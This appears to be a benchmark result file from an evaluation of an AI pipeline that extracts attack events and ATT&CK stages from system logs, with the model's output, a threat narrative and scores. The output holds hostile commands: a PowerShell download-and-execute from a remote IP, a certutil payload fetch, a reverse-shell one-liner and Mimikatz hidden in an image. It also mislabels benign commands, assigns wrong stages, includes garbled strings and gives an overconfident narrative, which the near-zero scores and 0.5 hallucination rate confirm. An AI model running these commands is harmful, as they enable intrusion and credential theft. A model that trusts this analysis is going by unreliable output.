@@ -1,0 +1,172 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\\\Windows\\\\System32\\\\smartscreen.exe -Embedding",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\\\Program Files (x86)\\\\\\\\\\Microsoft\\\\\\\\Edge\\\\\\\\Application\\\\\\\\MSEDGE.EXE",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\\\\\\\Program Files (x86)\\\\\\\\\\Microsoft\\\\\\\\Edge\\\\\\\\Application\\\\\\\\MSEDGE.EXE --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua /installsource scheduler",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\47\\u0536\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\u02bc\\ufffdB.ps1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0536\\ufffd\\ufffd\\ufffd\\ufffd\\ufffd\\u02bc\\ufffdB.ps1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C start C:\\WINDOWS\\system32\\cmd.exe /C \\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http:\\/\\/124\\.223\\.85\\.207:\\/\\/8082\\/Test\\.hta -Method '\\`'POST'\\`' -UseBasicParsing -ContentType `\"application\\/json\"\\",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "Invoke-PowerShellTcpOneLine -Reverse -IPAddress 124.223.85.207 -Port 8082 -Verbose",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-PSImage -Script .\\\\Invoke-Mimikatz\\.ps1 -Out .\\\\evil-kiwi\\.png -Image .\\\\995647\\.jpg\\\" ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powercfg.exe /batteryreport",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powercfg.exe /energy",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Invoke-WindowsAPI -ApiVersion 1 -CommandCode 3 -Parameter @{'FilePath': 'C:\\Users\\Administrator\\Desktop\\shell\\HookSSLX64.dll'}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup\\\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http:\\/\\/124\\.223\\.85\\.207:\\/\\/8082\\/Test\\.hta -Method '\\`'POST'\\`' -UseBasicParsing -ContentType `\"application\\/json\"\\",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"[Ref]\\`.Assembly.GetType('System.Management.Automation').GetMethod('EnterNestedPrompt')\\`.Invoke(null,'');\\\" ",
+        "stage": "Execution"
+      },
+      {
+        "command": "[Security.Principal.NtAccount]'{[guid]}'.Name=",
+        "stage": "Discovery"
+      },
+      {
+        "command": "\\\\nslookup www.google.com",
+        "stage": "Discovery"
+      },
+      {
+        "command": "\\\\whois google.com",
+        "stage": "Discovery"
+      },
+      {
+        "command": "runas /savecred \"C:\\Program Files\\Wireshark\\Wireshark.exe\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "get-process * | select-object id,handle",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -Command \"Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Path 'maintenance' | Where-Object {$_.Name -Match '\\.(exe|bat)$'} | Select-Object Name,FullName\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -scan -signatureupdate",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "{_privileged}",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "An advanced threat actor conducted a multi-stage attack consisting of Initial Access, Execution, Lateral Movement, Credential Access, Privilege Escalation, Command and Control, Defense Evasion, and Discovery. The attackers began by exploiting an initial access point using Smartscreen.exe and MSEDGE.EXE, then moved laterally across the network utilizing various tools such as PSImage and Mimikatz. They also performed privilege escalation actions using runas commands. While executing their attacks, they deployed anti-analysis techniques via hooking API calls. At multiple points during the intrusion, the adversaries attempted to download additional payloads from a remote server hosted at IP address 124.223.85.207. This indicates a possible connection between this campaign and other past APT operations leveraging similar tactics, techniques, and procedures (TTPs).",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 123551,
+      "completion_tokens": 6123,
+      "total_tokens": 129674,
+      "wall_clock_s": 156.657,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.03125,
+      "recall": 0.07142857142857142,
+      "f1": 0.043478260869565216,
+      "tp": 1,
+      "fp": 31,
+      "fn": 13
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 32,
+      "fn": 14,
+      "recall_partial": 0.03571428571428571
+    },
+    "hallucination_rate": 0.5,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 123551,
+      "completion_tokens": 6123,
+      "total_tokens": 129674,
+      "wall_clock_s": 156.657,
+      "parse_retries": 0
+    }
+  }
+}
